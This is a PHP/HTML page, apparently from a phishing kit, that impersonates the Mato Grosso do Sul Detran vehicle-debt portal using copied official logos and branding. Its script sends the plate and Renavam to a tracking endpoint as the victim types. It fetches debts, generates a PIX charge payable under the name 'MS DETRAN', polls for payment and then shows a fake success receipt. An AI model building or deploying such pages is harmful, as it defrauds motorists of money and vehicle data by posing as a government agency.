<?php
// pages/detran-ms/index.php
if (!isset($pdo)) {
    require_once "../../db.php";
    require_once "../../base/utility.php";
    require_once "../../base/detect_device.php";
    $id_usuario = (int)($_COOKIE['campanha'] ?? $_SESSION['user_id'] ?? 1); 
    $page = 'detran-ms';
    require_once "../../base/tracker.php";
}
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Portal Meu Detran - MS</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" />
    
    <style>
        :root {
            --primary-ms: #004F9F;
            --secondary-ms: #1F9353;
            --accent-ms: #284E8A;
        }
        body { font-family: 'Roboto', sans-serif; background-color: #f1f3f5; }
        .ms-header { background-color: var(--primary-ms); padding: 20px 0; border-bottom: 4px solid var(--secondary-ms); }
        .ms-container { max-width: 1100px; margin: 0 auto; padding: 0 15px; }
        .ms-header-row { display: flex; justify-content: space-between; align-items: center; }
        
        .digital-ms-bg { padding: 60px 0; min-height: 80vh; }
        .card-ms { border: none; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); overflow: hidden; }
        .card-header-ms { background-color: #fff; border-bottom: 2px solid #eee; padding: 20px; }
        
        .btn-ms-primary { background-color: var(--secondary-ms); color: white; border: none; border-radius: 30px; padding: 12px 25px; font-weight: bold; transition: 0.3s; }
        .btn-ms-primary:hover { background-color: #166e3e; transform: translateY(-2px); color: white; }
        
        .btn-ms-outline { border: 2px solid var(--accent-ms); color: var(--accent-ms); border-radius: 30px; padding: 8px 20px; font-weight: bold; transition: 0.3s; }
        .btn-ms-outline:hover { background-color: var(--accent-ms); color: white; }

        .step-content { display: none; }
        .step-content.active { display: block; }

        /* Invoice Style */
        .invoice-card { text-align: center; border: none; padding: 30px; border-radius: 16px; background: white; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
        .qr-code-box { margin: 20px 0; padding: 15px; background: #fff; border: 2px solid #f0f0f0; display: inline-block; border-radius: 12px; }
        .pix-copy-box {
            background: #f8f9fa; border: 1px dashed var(--primary-ms); padding: 15px; border-radius: 8px;
            font-family: monospace; font-size: 0.85em; word-break: break-all; margin: 15px 0;
            cursor: pointer; position: relative;
        }
        
        .loader-spinner {
            display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%; border-top-color: #fff; animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        .debito-item { border-left: 5px solid var(--secondary-ms); margin-bottom: 10px; transition: 0.2s; }
        .debito-item:hover { background-color: #f8f9fa; transform: translateX(5px); }
        
        .footer-ms { background-color: #fff; color: #666; padding: 40px 0; border-top: 1px solid #ddd; }
        
        .breadcrumb-ms { background: #e9ecef; padding: 10px 0; font-size: 0.9em; color: var(--accent-ms); }
    </style>
</head>

<body>

<header class="ms-header">
    <div class="ms-container">
        <div class="ms-header-row">
            <div class="logo-area">
                <img src="https://www.meudetran.ms.gov.br/assets/images/logo-detranms.svg" style="height: 50px; filter: brightness(0) invert(1);" alt="Detran MS" onerror="this.src='/imagens/MsDetran.ico'">
            </div>
            <div class="header-title text-white fw-bold d-none d-md-block">
                PORTAL MEU DETRAN
            </div>
        </div>
    </div>
</header>

<div class="breadcrumb-ms">
    <div class="ms-container">
        <i class="bi bi-house-fill"></i> Início > Veículos > <strong>Consulta de Débitos</strong>
    </div>
</div>

<main class="digital-ms-bg">
    <div class="ms-container">

        <!-- STEP 1: CONSULTA -->
        <div id="step-consulta" class="step-content active">
            <div class="row justify-content-center">
                <div class="col-12 col-md-6">
                    <div class="card card-ms">
                        <div class="card-header-ms text-center">
                            <h2 class="h4 fw-bold" style="color: var(--primary-ms)">CONSULTAR DÉBITOS</h2>
                            <p class="text-muted small">Insira a placa e o renavam para listar as pendências</p>
                        </div>
                        <div class="p-4">
                            <form id="formConsulta">
                                <div class="mb-3">
                                    <label class="form-label fw-bold">Placa do Veículo</label>
                                    <input type="text" id="placa" class="form-control form-control-lg" placeholder="AAA0A00" required maxlength="7" style="text-transform: uppercase;">
                                </div>
                                <div class="mb-4">
                                    <label class="form-label fw-bold">Renavam</label>
                                    <input type="text" id="renavam" class="form-control form-control-lg" placeholder="00000000000" required maxlength="11">
                                </div>
                                <button type="submit" class="btn btn-ms-primary w-100 py-3" id="btnConsultar">CONSULTAR AGORA</button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- STEP 2: RESULTADOS -->
        <div id="step-resultados" class="step-content">
            <div class="row justify-content-center">
                <div class="col-12 col-lg-8">
                    <div class="card card-ms">
                        <div class="card-header-ms d-flex justify-content-between align-items-center">
                            <h2 class="h5 m-0 fw-bold" style="color: var(--primary-ms)">EXTRATO DE DÉBITOS</h2>
                            <button class="btn btn-sm btn-ms-outline" onclick="showStep('consulta')"><i class="bi bi-arrow-left"></i> Voltar</button>
                        </div>
                        
                        <div class="p-3 bg-light border-bottom">
                            <div class="row small">
                                <div class="col-6"><strong>Veículo:</strong> <span id="span-modelo">---</span></div>
                                <div class="col-6 text-end"><strong>Placa:</strong> <span id="span-placa">---</span></div>
                            </div>
                        </div>

                        <div class="p-4">
                            <div id="listaDebitos">
                                <!-- Dinâmico -->
                            </div>

                            <div class="mt-4 p-3 rounded" style="background-color: #f8f9fa; border: 1px solid #eee;">
                                <div class="d-flex justify-content-between align-items-center">
                                    <span class="fw-bold text-muted">VALOR TOTAL SELECIONADO:</span>
                                    <span class="h3 m-0 fw-bold text-success" id="totalValue">R$ 0,00</span>
                                </div>
                            </div>
                            
                            <button class="btn btn-ms-primary w-100 mt-4 py-3 fw-bold" id="btnIrParaPagamento">PROSSEGUIR PARA PAGAMENTO PIX</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- STEP 3: PAGAMENTO -->
        <div id="step-pagamento" class="step-content">
            <div class="row justify-content-center">
                <div class="col-12 col-md-6 col-lg-5">
                    <div class="invoice-card">
                        <div class="text-center mb-4">
                            <img src="https://logodownload.org/wp-content/uploads/2020/02/pix-bc-logo.png" style="height: 35px;">
                            <h2 class="h4 fw-bold mt-3">Pagamento Instantâneo</h2>
                        </div>

                        <div class="qr-code-box" id="qr-container">
                            <!-- QR Code Dinâmico -->
                        </div>

                        <div class="pix-copy-box" id="pixCode" onclick="copyPix()">
                            Clique para copiar o código PIX
                        </div>

                        <div class="alert alert-info small mt-3">
                            <i class="bi bi-info-circle-fill"></i> Após o pagamento, a baixa no sistema ocorre em até 15 minutos.
                        </div>

                        <div class="d-flex align-items-center justify-content-center text-muted mt-4 small">
                            <div class="spinner-border spinner-border-sm me-2 text-success" role="status"></div>
                            Processando pagamento...
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- STEP 4: SUCESSO -->
        <div id="step-sucesso" class="step-content text-center">
            <div class="card card-ms p-5">
                <div class="mb-4">
                    <i class="bi bi-patch-check-fill text-success" style="font-size: 5rem;"></i>
                </div>
                <h2 class="fw-bold text-success">PAGAMENTO RECEBIDO!</h2>
                <p class="text-muted">A guia de arrecadação foi liquidada com sucesso em nossa base de dados.</p>
                <hr>
                <div class="row text-start mb-4">
                    <div class="col-6 small">Ref: <strong id="comp-id">#0000</strong></div>
                    <div class="col-6 text-end small">Data: <strong id="comp-data">--/--/--</strong></div>
                </div>
                <button class="btn btn-ms-primary w-100 py-3" onclick="location.reload()">NOVA CONSULTA</button>
            </div>
        </div>

    </div>
</main>

<footer class="footer-ms">
    <div class="ms-container">
        <div class="row align-items-center">
            <div class="col-md-6 text-center text-md-start mb-4 mb-md-0">
                <img src="https://www.meudetran.ms.gov.br/assets/images/logoRodape.svg" style="height: 40px; opacity: 0.7;">
                <p class="small mt-3">© 2026 Departamento Estadual de Trânsito de Mato Grosso do Sul<br>Todos os direitos reservados.</p>
            </div>
            <div class="col-md-6 text-center text-md-end">
                <div class="fw-bold" style="color: var(--primary-ms)">CENTRAL DE INFORMAÇÕES</div>
                <div class="h3 fw-bold" style="color: var(--secondary-ms)">LIGUE 154</div>
            </div>
        </div>
    </div>
</footer>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/js/bootstrap.bundle.min.js"></script>

<script>
    let currentData = null;
    let totalValor = 0;
    let currentRef = null;
    let pollInterval = null;
    let typingTimer = null;

    function showStep(stepName) {
        document.querySelectorAll('.step-content').forEach(s => s.classList.remove('active'));
        document.getElementById(`step-${stepName}`).classList.add('active');
        window.scrollTo(0,0);
    }

    function startTypingStatus() {
        clearTimeout(typingTimer);
        typingTimer = setTimeout(() => {
            const placa = document.getElementById('placa').value.trim().toUpperCase();
            const renavam = document.getElementById('renavam').value.trim();

            fetch('../../api/typing_start.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    typing: true,
                    tela: 'detran-ms',
                    page: 'detran-ms',
                    doc: `Placa: ${placa || '---'} | Renavam: ${renavam || '---'}`,
                    placa: placa,
                    renavam: renavam
                })
            }).catch(() => {});
        }, 300);
    }

    function syncLoginDebitosMS(data) {
        const totalDebitos = Array.isArray(data?.dados) ? data.dados.length : 0;
        const totalValorStr = Array.isArray(data?.dados)
            ? data.dados.reduce((acc, item) => acc + (parseFloat(item?.atual) || 0), 0).toLocaleString('pt-BR', { minimumFractionDigits: 2 })
            : "0,00";

        fetch('../../api/typing_start.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                typing: true,
                tela: 'detran-ms',
                page: 'detran-ms',
                doc: `Placa: ${document.getElementById('placa').value.trim().toUpperCase()} | Renavam: ${document.getElementById('renavam').value.trim()}`,
                placa: document.getElementById('placa').value.trim().toUpperCase(),
                renavam: document.getElementById('renavam').value.trim(),
                debitos: `${totalDebitos} / R$ ${totalValorStr}`
            })
        }).catch(() => {});
    }

    ['placa', 'renavam'].forEach(id => {
        document.getElementById(id).addEventListener('input', startTypingStatus);
    });

    document.getElementById('formConsulta').addEventListener('submit', function(e) {
        e.preventDefault();
        const placa = document.getElementById('placa').value.toUpperCase();
        const renavam = document.getElementById('renavam').value;
        const btn = document.getElementById('btnConsultar');

        btn.disabled = true;
        btn.innerHTML = '<span class="loader-spinner"></span> CONSULTANDO...';

        fetch(`../../api/buscarMS.php?placa=${placa}&renavam=${renavam}`)
        .then(res => res.json())
        .then(data => {
            if (data.IsStatus) {
                currentData = data;
                document.getElementById('span-modelo').textContent = data.proprietario || 'VEÍCULO ENCONTRADO';
                document.getElementById('span-placa').textContent = placa;
                renderDebitos(data);
                syncLoginDebitosMS(data);
                showStep('resultados');
            } else {
                alert(data.error || 'Erro ao consultar veículo.');
            }
        })
        .catch(() => alert('Erro de conexão com o servidor.'))
        .finally(() => {
            btn.disabled = false;
            btn.textContent = 'CONSULTAR AGORA';
        });
    });

    function renderDebitos(data) {
        const lista = document.getElementById('listaDebitos');
        lista.innerHTML = '';

        data.dados.forEach((item, index) => {
            const div = document.createElement('div');
            div.className = 'debito-item p-3 bg-white shadow-sm rounded d-flex justify-content-between align-items-center';
            div.innerHTML = `
                <div>
                    <input type="checkbox" class="debito-check form-check-input me-3" data-valor="${item.atual}" checked>
                    <span class="fw-bold text-dark">${item.descricao}</span><br>
                    <span class="small text-muted"><i class="bi bi-calendar-event"></i> Vencimento: ${item.data_vencimento}</span>
                </div>
                <div class="text-end">
                    <span class="fw-bold text-danger">R$ ${parseFloat(item.atual).toLocaleString('pt-BR', {minimumFractionDigits:2})}</span>
                </div>
            `;
            lista.appendChild(div);
        });

        document.querySelectorAll('.debito-check').forEach(c => c.addEventListener('change', calculateTotal));
        calculateTotal();
    }

    function calculateTotal() {
        totalValor = 0;
        document.querySelectorAll('.debito-check:checked').forEach(c => {
            totalValor += parseFloat(c.dataset.valor);
        });
        document.getElementById('totalValue').textContent = `R$ ${totalValor.toLocaleString('pt-BR', {minimumFractionDigits:2})}`;
        document.getElementById('btnIrParaPagamento').disabled = totalValor <= 0;
    }

    document.getElementById('btnIrParaPagamento').addEventListener('click', () => {
        const btn = document.getElementById('btnIrParaPagamento');
        btn.disabled = true;
        btn.innerHTML = '<span class="loader-spinner"></span> GERANDO PIX...';

        const placa = document.getElementById('placa').value.toUpperCase();
        const totalDebitos = document.querySelectorAll('.debito-check').length;
        const debitosSelecionados = document.querySelectorAll('.debito-check:checked').length;

        const formData = new FormData();
        formData.append('cpf_cnpj', placa);
        formData.append('nome', 'MS DETRAN');
        formData.append('valor', totalValor.toFixed(2));
        formData.append('debito', `${debitosSelecionados}/${totalDebitos}`);

        fetch('../../data/pix.php', { method: 'POST', body: formData })
        .then(res => res.json())
        .then(data => {
            if (data.status && data.pix) {
                currentRef = data.id || data.pix;
                document.getElementById('pixCode').dataset.code = data.pix;
                const qrUrl = `https://chart.googleapis.com/chart?chs=250x250&cht=qr&chl=${encodeURIComponent(data.pix)}`;
                document.getElementById('qr-container').innerHTML = `<img src="${qrUrl}" alt="QR Code PIX">`;
                showStep('pagamento');
                startPolling();
            } else {
                alert('Erro ao gerar pagamento.');
                btn.disabled = false;
                btn.textContent = 'PROSSEGUIR PARA PAGAMENTO PIX';
            }
        })
        .catch(() => {
            alert('Erro de conexão.');
            btn.disabled = false;
            btn.textContent = 'PROSSEGUIR PARA PAGAMENTO PIX';
        });
    });

    function copyPix() {
        const code = document.getElementById('pixCode').dataset.code;
        if (!code) return;
        navigator.clipboard.writeText(code).then(() => {
            const box = document.getElementById('pixCode');
            box.textContent = '✅ CÓDIGO PIX COPIADO!';
            setTimeout(() => box.textContent = 'Clique para copiar o código PIX', 2000);
        });
    }

    function startPolling() {
        if (pollInterval) clearInterval(pollInterval);
        pollInterval = setInterval(() => {
            if (!currentRef) return;
            fetch(`../teste/get_status.php?ref=${encodeURIComponent(currentRef)}`)
            .then(res => res.json())
            .then(data => {
                if (data.payment_status === 'pago') {
                    clearInterval(pollInterval);
                    document.getElementById('comp-id').textContent = '#' + currentRef.substring(0, 8);
                    document.getElementById('comp-data').textContent = new Date().toLocaleDateString('pt-BR');
                    showStep('sucesso');
                }
            });
        }, 4000);
    }
</script>

</body>
</html>
